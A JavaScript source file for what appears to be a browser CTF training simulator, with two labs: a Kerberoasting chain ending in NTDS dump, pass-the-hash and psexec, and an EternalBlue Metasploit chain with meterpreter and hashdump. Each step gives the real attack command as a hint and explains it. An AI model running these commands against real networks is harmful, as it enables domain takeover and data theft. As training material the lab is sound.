'use strict';

// ── Kerberoasting challenges ──────────────────────────────────────────────────
const KERBEROAST_CHALLENGES = [
  {
    id: 1, title: 'Port Scan the DC', pts: 100,
    flag: 'FLAG{dc01_discovered_ports_445_88_389}',
    hint: 'sudo nmap -sV -sC 10.10.10.10',
    explain: 'Before you can hack anything, you need to know what\'s there. A port scan is like walking up to a building and checking every door and window to see which ones are open. Every service running on a computer listens on a numbered "port" — web servers use port 80, email uses port 25, and so on.\n\nNmap is the tool everyone uses for this. The -sV flag makes it figure out what software is running on each open port. The -sC flag runs a set of built-in checks to grab extra info automatically.\n\nWhen you scan a Windows Domain Controller you\'ll see port 88 (that\'s Kerberos — the login system), port 389 (LDAP — the user directory), and port 445 (SMB — Windows file sharing). Seeing all three together is a dead giveaway that this is the main Windows server controlling the whole network.',
    done: false,
    check: r => r.id === 'nmap-full',
  },
  {
    id: 2, title: 'SMB Enumeration', pts: 100,
    flag: 'FLAG{corp_local_domain_enumerated}',
    hint: 'enum4linux -a 10.10.10.10',
    explain: 'SMB is the Windows file-sharing protocol. Older Windows servers (and many that haven\'t been hardened) allow you to connect anonymously — without a username or password — and still get back useful information. This is called a "null session."\n\nenum4linux automates this. It connects to the target and asks it questions that a normal Windows computer would ask, like "who are the users here?" and "what are the password rules?"\n\nFrom this scan we learn the domain name (CORP.LOCAL), all the usernames (john.doe, svc_backup, svc_sql, svc_web), and that accounts lock out after 5 wrong password attempts. Those usernames are gold — they\'re our targets for the rest of the attack.',
    done: false,
    check: r => r.id === 'enum4linux',
  },
  {
    id: 3, title: 'Validate Credentials', pts: 150,
    flag: 'FLAG{john_doe_authenticated_smb}',
    hint: "crackmapexec smb 10.10.10.10 -u john.doe -p 'Password1!'",
    explain: 'We found a notes file on a workstation earlier that had john.doe\'s password written in it. People do this all the time — they save passwords in text files, sticky notes, or shared drives because it\'s convenient. Now we need to check if that password actually works on the main server.\n\nCrackMapExec (CME) is a tool that tests credentials against Windows machines. You give it a username, a password, and a target, and it tells you if the login works.\n\nA [+] result means success — we have a real, working domain account. This is our first foothold. We\'re now a legitimate (if low-level) user inside the network.',
    done: false,
    check: r => r.id === 'cme-johndoe',
  },
  {
    id: 4, title: 'Find SPNs', pts: 200,
    flag: 'FLAG{3_spns_found_svc_backup_svc_sql_svc_web}',
    hint: "impacket-GetUserSPNs CORP.LOCAL/john.doe:'Password1!' -dc-ip 10.10.10.10",
    explain: 'This is where Kerberoasting begins. First, some background:\n\nIn Windows networks, services (like a database, a backup program, or a web app) are often run under special accounts called "service accounts." To help Windows find these services, each one is registered with a "Service Principal Name" (SPN) — basically a label that says "this account runs this service."\n\nHere\'s the attack: any normal domain user can ask the Domain Controller for a Kerberos "ticket" to access any of these services. The DC encrypts that ticket using the service account\'s password. We can take that encrypted ticket home and try to crack it offline.\n\nThis step just lists the available targets. We find three service accounts — svc_backup, svc_sql, and svc_web — all of which we can request tickets for.',
    done: false,
    check: r => r.id === 'spns-enum',
  },
  {
    id: 5, title: 'Request TGS Tickets', pts: 250,
    flag: 'FLAG{tgs_tickets_captured_rc4_etype23}',
    hint: "impacket-GetUserSPNs CORP.LOCAL/john.doe:'Password1!' -dc-ip 10.10.10.10 -request -outputfile hashes.kerberoast",
    explain: 'Now we actually perform the Kerberoasting attack.\n\nWe ask the Domain Controller to give us Kerberos service tickets for each of the three service accounts. The DC does exactly what it\'s supposed to do — it creates a ticket, encrypts it with the service account\'s password hash, and hands it to us. No alarms, no errors, completely normal behaviour.\n\nThe trick is that we don\'t actually need to use these tickets to access the services. We just need the encrypted data inside them, because that encrypted data was created using the service account\'s password. If the password is weak, we can crack it.\n\nWe save the tickets to a file called hashes.kerberoast. Next step: crack them.',
    done: false,
    check: r => r.id === 'spns-request',
  },
  {
    id: 6, title: 'Crack TGS Hashes', pts: 300,
    flag: 'FLAG{svc_backup_cracked_Backup2023}',
    hint: 'john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt',
    explain: 'Password cracking sounds complicated but the concept is simple: take a list of common passwords, run each one through the same encryption the DC used, and see if the result matches what we captured. If it matches, we found the password.\n\nJohn the Ripper does this automatically. We give it our captured tickets and a wordlist — rockyou.txt contains 14 million real passwords leaked from actual data breaches over the years.\n\nService accounts are a weak point because IT teams often set them up once with a simple password and never change them. Nobody\'s logging in with them interactively, so the password never expires. "Backup2023!" is exactly the kind of password a sysadmin types once in 2023 and forgets about.\n\nWhen John finds a match, we have the real plaintext password.',
    done: false,
    check: r => r.id === 'john-crack' || r.id === 'hashcat',
  },
  {
    id: 7, title: 'Validate svc_backup', pts: 200,
    flag: 'FLAG{svc_backup_backup_operators_group}',
    hint: "crackmapexec smb 10.10.10.10 -u svc_backup -p 'Backup2023!'",
    explain: 'We cracked the password — now we confirm it works. But there\'s something more important here than just another working login.\n\nLook at the CME output carefully: it says svc_backup is in the "Backup Operators" group. This is a built-in Windows group that was designed for backup software — it needs to be able to read every file on the system to back them up, even protected system files.\n\nAttackers love Backup Operators because it can read NTDS.dit — the Active Directory database file that stores the password hashes for every single user in the domain. Administrators, regular users, other service accounts — all of them.\n\nOne cracked service account password just gave us the keys to the entire domain.',
    done: false,
    check: r => r.id === 'cme-svcbackup',
  },
  {
    id: 8, title: 'Dump NTDS.dit', pts: 400,
    flag: 'FLAG{ntds_dumped_all_domain_hashes}',
    hint: "impacket-secretsdump CORP.LOCAL/svc_backup:'Backup2023!'@10.10.10.10",
    explain: 'NTDS.dit is the crown jewel of any Windows domain. It\'s a database file that the Domain Controller keeps locked and protected — it contains the password hash for every account in the organisation.\n\nimpacket-secretsdump connects to the DC using svc_backup\'s credentials and uses the Backup Operators privileges to remotely read and extract this database. It never needs to copy the actual file — it uses a Windows API called VSS (Volume Shadow Copy Service) to read it while it\'s in use.\n\nThe output is a list of every user account and their NT hash. In a real company this could be thousands of accounts. Every single one of those hashes can be cracked offline or used directly in the next step — no cracking required.',
    done: false,
    check: r => r.id === 'secretsdump',
  },
  {
    id: 9, title: 'Pass-the-Hash', pts: 350,
    flag: 'FLAG{administrator_pth_pwn3d}',
    hint: 'crackmapexec smb 10.10.10.10 -u Administrator -H fc525c9683e8fe067095ba2ddc971889',
    explain: 'Here\'s something surprising about Windows: when you log in, your computer never actually sends your password to the server. Instead it sends a "hash" — a scrambled version of your password — as proof that you know it.\n\nThis means if you have someone\'s hash, you can log in as them without ever knowing their real password. This is called Pass-the-Hash (PtH).\n\nWe grabbed the Administrator\'s hash from the NTDS dump. We pass it directly to CME with the -H flag instead of a password. Windows accepts it as valid authentication.\n\nThe [+] Pwn3d! response means we have full Domain Administrator access. We own the entire network.',
    done: false,
    check: r => r.id === 'cme-pth',
  },
  {
    id: 10, title: 'SYSTEM Shell', pts: 500,
    flag: 'FLAG{dc01_compromised_nt_authority_system}',
    hint: 'impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 CORP.LOCAL/Administrator@10.10.10.10',
    explain: 'psexec is a tool that uses admin credentials to run programs on a remote Windows machine. It works by uploading a tiny service to the target, starting it, and connecting to it — giving you an interactive command prompt on the remote machine.\n\nBecause we\'re using the Administrator hash, the service runs as NT AUTHORITY\\SYSTEM — the highest privilege level that exists on Windows. SYSTEM is above Administrator. It can read and write any file, change any setting, and cannot be locked out or restricted by normal security policies.\n\nWe now have a fully interactive shell on the Domain Controller with unlimited access. The attack is complete. From a single port scan to full domain compromise — all because one service account had a weak password.',
    done: false,
    check: r => r.id === 'psexec',
  },
  {
    id: 11, title: 'Exfiltrate Loot', pts: 500,
    flag: 'FLAG{23452_customers_pwned_pci_dss_breach_confirmed}',
    hint: 'dir C:\\CORP_DATA  (then: type C:\\CORP_DATA\\Customer\\Credit_Card_Database.csv)',
    explain: 'With SYSTEM access on the Domain Controller we can read any file on the server. This final step shows why attackers don\'t stop at "I have access" — they look for data worth stealing.\n\nCompanies sometimes store sensitive files on the DC because it\'s a powerful, always-on machine. Here we find a folder called CORP_DATA containing financial records, HR files with employee SSNs, and a customer credit card database with 23,452 records including card numbers, CVVs, expiry dates, and social security numbers.\n\nThis is a full PCI-DSS breach — the kind that results in millions in fines, mandatory customer notification, and potential criminal charges.\n\nThe entire attack chain took one weak service account password. That\'s it. One password that was never rotated, on an account nobody was watching, brought down the whole organisation.',
    done: false,
    check: r => r.id === 'loot-exfil',
  },
];

// ── EternalBlue challenges ────────────────────────────────────────────────────
const ETERNALBLUE_CHALLENGES = [
  {
    id: 1, title: 'Discover the Target', pts: 100,
    flag: 'FLAG{win7_host_discovered_10_10_20_10}',
    hint: 'sudo nmap -sn 10.10.20.0/24',
    explain: 'Every attack starts with reconnaissance — figuring out what\'s on the network before you try anything.\n\nA "ping sweep" sends a small packet to every possible address in a network range and listens for replies. Any machine that replies is alive and worth investigating. The -sn flag tells nmap to only do this discovery step and not scan ports yet.\n\nThe range 10.10.20.0/24 means "check all 256 addresses from 10.10.20.0 to 10.10.20.255." We find a Windows 7 machine at 10.10.20.10.\n\nWindows 7 reached end-of-life in January 2020, meaning Microsoft stopped releasing security patches for it. Any vulnerability discovered after that date will never be fixed. Machines like this are extremely common in real corporate networks — they\'re expensive to upgrade and often running critical software that can\'t be moved.',
    done: false,
    check: r => r.id === 'nmap-eb-discovery',
  },
  {
    id: 2, title: 'Identify Vulnerability', pts: 150,
    flag: 'FLAG{ms17_010_eternalblue_confirmed}',
    hint: 'sudo nmap -sV --script smb-vuln-ms17-010 10.10.20.10',
    explain: 'MS17-010 is one of the most famous vulnerabilities in history. Here\'s the story:\n\nThe NSA discovered a critical flaw in Windows\'s file-sharing protocol (SMB) and secretly developed an exploit for it called EternalBlue. They used it for years for intelligence gathering. In 2017, a hacker group called Shadow Brokers stole and published the NSA\'s hacking tools online — including EternalBlue.\n\nWithin weeks, criminal groups weaponised it. The WannaCry ransomware used EternalBlue to infect 230,000 computers in 150 countries in a single day, including the UK\'s National Health Service. The NotPetya attack caused $10 billion in damage worldwide.\n\nThe vulnerability allows an attacker to run any code they want on a target machine with no username, no password, and no interaction from the victim. The nmap script checks if the target is unpatched. A VULNERABLE result means we can get in.',
    done: false,
    check: r => r.id === 'nmap-eb-vuln',
  },
  {
    id: 3, title: 'Launch Metasploit', pts: 100,
    flag: 'FLAG{msfconsole_ready}',
    hint: 'msfconsole',
    explain: 'Metasploit is the most widely used hacking framework in the world — used by both professional penetration testers and real attackers. It\'s a collection of pre-written exploit code, payloads, and tools all wrapped in an easy-to-use interface.\n\nThink of it like a toolbox where someone else has already done the hard work of writing the exploit. You just pick the right tool, point it at a target, and pull the trigger.\n\nmsfconsole is the interactive command-line interface for Metasploit. When it loads you\'ll see the msf6 > prompt. From here you can search for exploits, load modules, configure options, and run attacks.\n\nMetasploit is free, open source, and comes pre-installed on Kali Linux.',
    done: false,
    check: r => r.id === 'msfconsole',
  },
  {
    id: 4, title: 'Load EternalBlue Module', pts: 150,
    flag: 'FLAG{eternalblue_module_loaded}',
    hint: 'use exploit/windows/smb/ms17_010_eternalblue',
    explain: 'Metasploit organises its tools into "modules" sorted by category. The path exploit/windows/smb/ms17_010_eternalblue tells you exactly what it is: an exploit, targeting Windows, via SMB, specifically the MS17-010 vulnerability.\n\nThe "use" command loads that module and makes it active. You\'ll see the prompt change to include the module name — that\'s confirmation it\'s loaded.\n\nYou can type "show options" at any point to see what settings the module needs before it can run. You can also type "info" to read a full description of the exploit including its history and technical details.',
    done: false,
    check: r => r.id === 'msf-use',
  },
  {
    id: 5, title: 'Configure the Exploit', pts: 150,
    flag: 'FLAG{rhosts_lhost_configured}',
    hint: 'set RHOSTS 10.10.20.10\nset LHOST 10.10.20.5',
    explain: 'Before running any exploit you need to tell it where to go and where to come back to.\n\nRHOSTS is the target — the machine you\'re attacking. "R" stands for Remote.\n\nLHOST is your own machine\'s IP address — where the shell will connect back to. "L" stands for Local.\n\nWhy does the shell connect back to us instead of us connecting to it? Because most firewalls block incoming connections but allow outgoing ones. A "reverse shell" has the victim machine reach out to the attacker, which looks like normal outbound traffic and slips past the firewall.\n\nAfter setting these, type "show options" to confirm everything looks right before running.',
    done: false,
    check: r => r.id === 'msf-set',
  },
  {
    id: 6, title: 'Run the Exploit', pts: 400,
    flag: 'FLAG{meterpreter_session_opened}',
    hint: 'run',
    explain: 'This is the moment everything comes together. Type "run" and watch.\n\nEternalBlue works by sending a specially crafted packet to the Windows SMB service. The packet triggers a buffer overflow — it writes data into a part of memory it shouldn\'t be able to reach, and that data happens to be code that we control. The Windows kernel executes our code before any authentication check happens.\n\nOur payload is called Meterpreter. It\'s an advanced shell that runs entirely in RAM — it never writes any files to disk. This makes it nearly invisible to antivirus software, which mostly looks for malicious files.\n\nIf the exploit succeeds you\'ll see "Meterpreter session 1 opened" and the prompt changes to meterpreter >. You\'re in.',
    done: false,
    check: r => r.id === 'msf-run',
  },
  {
    id: 7, title: 'Verify Access', pts: 200,
    flag: 'FLAG{nt_authority_system_eternalblue}',
    hint: 'getuid\nsysinfo',
    explain: 'First thing after getting a shell: figure out who you are and what you\'re on.\n\ngetuid asks "what account am I running as?" The answer — NT AUTHORITY\\SYSTEM — is the best possible result. SYSTEM is the highest privilege level on Windows, above even Administrator. It has unrestricted access to everything on the machine.\n\nThis is why EternalBlue is so dangerous: it exploits a kernel-level bug, so the code runs in the kernel\'s security context — SYSTEM — automatically. No privilege escalation needed. You go from zero access to full control in one step.\n\nsysinfo shows the machine details: OS version, hostname, architecture. This confirms we\'re on the right target and tells us what tools and techniques will work next.',
    done: false,
    check: r => r.id === 'msf-getuid',
  },
  {
    id: 8, title: 'Dump Password Hashes', pts: 300,
    flag: 'FLAG{sam_hashes_dumped}',
    hint: 'hashdump',
    explain: 'Every Windows machine stores local account passwords in a database called the SAM (Security Account Manager). The passwords aren\'t stored in plain text — they\'re stored as NT hashes, a scrambled version of the password.\n\nNormally the SAM is locked and encrypted while Windows is running. But because we\'re running as SYSTEM, we can read it directly.\n\nhashdump extracts all the local account hashes. You\'ll see the Administrator account and its hash. These hashes can be:\n\n1. Cracked offline using john or hashcat to recover the real password\n2. Used directly in Pass-the-Hash attacks against other machines on the network without cracking them at all\n\nIn a corporate network, local Administrator accounts often share the same password across hundreds of machines. One hash can unlock them all.',
    done: false,
    check: r => r.id === 'msf-hashdump',
  },
  {
    id: 9, title: 'Pillage the Filesystem', pts: 250,
    flag: 'FLAG{secret_docs_exfiltrated}',
    hint: 'shell\ntype C:\\Users\\Administrator\\Desktop\\secret.txt',
    explain: 'Meterpreter is powerful but sometimes you just need a plain Windows command prompt. The "shell" command drops you into cmd.exe running as SYSTEM on the target machine.\n\nFrom here you can navigate the filesystem exactly like you\'re sitting at the keyboard. The Administrator\'s Desktop is always worth checking — people leave sensitive files there constantly. Passwords, internal documents, configuration files, notes with credentials.\n\nThis step simulates the data exfiltration phase of a real attack — finding and stealing the valuable data that justifies the whole operation. In real incidents, attackers often spend weeks quietly exploring a network after getting initial access, mapping out what\'s there before taking anything.\n\nType "exit" when done to return to the Meterpreter prompt.',
    done: false,
    check: r => r.id === 'msf-shell-loot',
  },
];

const CTF = {
  _lab: 'kerberoast',
  _labs: {
    kerberoast: KERBEROAST_CHALLENGES,
    eternalblue: ETERNALBLUE_CHALLENGES,
  },

  get challenges() { return this._labs[this._lab]; },

  _loadState() {
    try {
      const s = JSON.parse(localStorage.getItem('ctf_state_' + this._lab) || '{}');
      this.challenges.forEach(c => { if (s[c.id]) c.done = true; });
    } catch {}
  },

  _saveState() {
    const s = {};
    this.challenges.forEach(c => { if (c.done) s[c.id] = true; });
    localStorage.setItem('ctf_state_' + this._lab, JSON.stringify(s));
  },

  score()    { return this.challenges.filter(c => c.done).reduce((a, c) => a + c.pts, 0); },
  maxScore() { return this.challenges.reduce((a, c) => a + c.pts, 0); },
  doneCount(){ return this.challenges.filter(c => c.done).length; },

  switchLab(labId) {
    if (!this._labs[labId]) return;
    this._lab = labId;
    // Reset SIM state for the new lab
    SIM.windowsShell = false;
    SIM.hashesOnDisk = false;
    SIM.lootExfiltrated = false;
    SIM.msfActive = false;
    SIM.msfModule = null;
    SIM.msfOptions = {};
    SIM.meterpreter = false;
    SIM.ebTarget = '10.10.20.10';
    SIM.user = 'kali';
    SIM.cwd  = '/home/kali';
    TERM_INSTANCES.forEach(t => t._updatePrompt());
    this._loadState();
    this._renderSidebar();
  },

  check(result) {
    if (!result || !result.id) return null;
    for (const c of this.challenges) {
      if (!c.done && c.check(result)) {
        c.done = true;
        this._saveState();
        return c;
      }
    }
    return null;
  },

  reset() {
    this.challenges.forEach(c => c.done = false);
    localStorage.removeItem('ctf_state_' + this._lab);
    SIM.hashesOnDisk = false;
    SIM.windowsShell = false;
    SIM.lootExfiltrated = false;
    SIM.msfActive = false;
    SIM.msfModule = null;
    SIM.msfOptions = {};
    SIM.meterpreter = false;
    SIM.user = 'kali';
    SIM.cwd  = '/home/kali';
    TERM_INSTANCES.forEach(t => t._updatePrompt());
    this._renderSidebar();
  },

  // ── Sidebar UI ─────────────────────────────────────────────────────────────
  _renderSidebar() {
    const list    = document.getElementById('ctf-list');
    const scoreEl = document.getElementById('ctf-score');
    const barEl   = document.getElementById('ctf-bar');
    const progEl  = document.getElementById('ctf-progress-label');
    const maxEl   = document.getElementById('ctf-max');
    if (!list) return;

    scoreEl.textContent = this.score().toLocaleString();
    if (maxEl) maxEl.textContent = ' / ' + this.maxScore().toLocaleString() + ' pts';
    const pct = Math.round(this.score() / this.maxScore() * 100);
    barEl.style.width = pct + '%';
    progEl.textContent = `${this.doneCount()} / ${this.challenges.length} completed`;

    list.innerHTML = this.challenges.map(c => `
      <div class="ctf-item${c.done ? ' done' : ''}" data-cid="${c.id}" style="cursor:pointer">
        <div class="ctf-item-header">
          <div class="ctf-num">${c.done ? '✓' : c.id}</div>
          <div class="ctf-title">${c.title}</div>
          <div class="ctf-pts">${c.pts}pts</div>
          <i class="fa fa-circle-info ctf-info-btn" title="What is this?"></i>
        </div>
        ${c.done
          ? `<div class="ctf-flag">${c.flag}</div>`
          : `<div class="ctf-hint-row"><span class="ctf-hint">${c.hint.split('\n')[0]}</span><button class="ctf-copy-btn" data-cmd="${c.hint.replace(/"/g,'&quot;')}" title="Copy command"><i class="fa fa-copy"></i></button></div>`}
      </div>`
    ).join('');

    list.querySelectorAll('.ctf-item').forEach(el => {
      el.addEventListener('click', e => {
        if (e.target.closest('.ctf-copy-btn')) return;
        const cid = parseInt(el.dataset.cid);
        const ch  = this.challenges.find(c => c.id === cid);
        if (ch) this._showExplain(ch);
      });
    });

    list.querySelectorAll('.ctf-copy-btn').forEach(btn => {
      btn.addEventListener('click', e => {
        e.stopPropagation();
        const cmd = btn.dataset.cmd.split('\n')[0];
        CTF._pasteToTerminal(cmd);
        btn.innerHTML = '<i class="fa fa-check"></i>';
        setTimeout(() => { btn.innerHTML = '<i class="fa fa-copy"></i>'; }, 1500);
      });
    });
  },

  _pasteToTerminal(cmd) {
    const inst = TERM_INSTANCES.find(t => !t._busy && !t._nano) || TERM_INSTANCES[TERM_INSTANCES.length - 1];
    if (!inst) return;
    inst._setInput(cmd);
    inst.focus();
  },

  _showExplain(ch) {
    document.getElementById('ctf-explain-num').textContent   = ch.id;
    document.getElementById('ctf-explain-title').textContent = ch.title;
    document.getElementById('ctf-explain-text').textContent  = ch.explain;
    document.getElementById('ctf-explain-hint').textContent  = ch.hint;
    const copyBtn = document.getElementById('ctf-explain-copy');
    copyBtn.onclick = () => {
      CTF._pasteToTerminal(ch.hint.split('\n')[0]);
      copyBtn.innerHTML = '<i class="fa fa-check"></i> Pasted';
      setTimeout(() => { copyBtn.innerHTML = '<i class="fa fa-copy"></i> Copy'; }, 1500);
    };
    document.getElementById('ctf-explain-modal').classList.remove('hidden');
  },

  showFlagPopup(challenge) {
    document.getElementById('fp-challenge').textContent = challenge.title;
    document.getElementById('fp-flag').textContent = challenge.flag;
    document.getElementById('fp-pts').textContent = `+${challenge.pts} points`;
    document.getElementById('flag-popup').classList.remove('hidden');
    clearTimeout(this._popupTimer);
    this._popupTimer = setTimeout(() => {
      document.getElementById('flag-popup').classList.add('hidden');
    }, 9000);
  },

  init() {
    this._loadState();
    this._renderSidebar();

    document.getElementById('ctf-lab-select').addEventListener('change', e => {
      this.switchLab(e.target.value);
    });

    document.getElementById('ctf-reset-btn').addEventListener('click', () => {
      if (confirm('Reset all CTF progress?')) this.reset();
    });

    const closeExplain = () => document.getElementById('ctf-explain-modal').classList.add('hidden');
    document.getElementById('ctf-explain-close').addEventListener('click', closeExplain);
    document.getElementById('ctf-explain-ok').addEventListener('click', closeExplain);
    document.getElementById('ctf-explain-modal').addEventListener('click', e => {
      if (e.target === document.getElementById('ctf-explain-modal')) closeExplain();
    });

    document.getElementById('ctf-close-btn')?.addEventListener('click', () => {
      document.getElementById('ctf-sidebar').classList.add('collapsed');
    });
  },
};
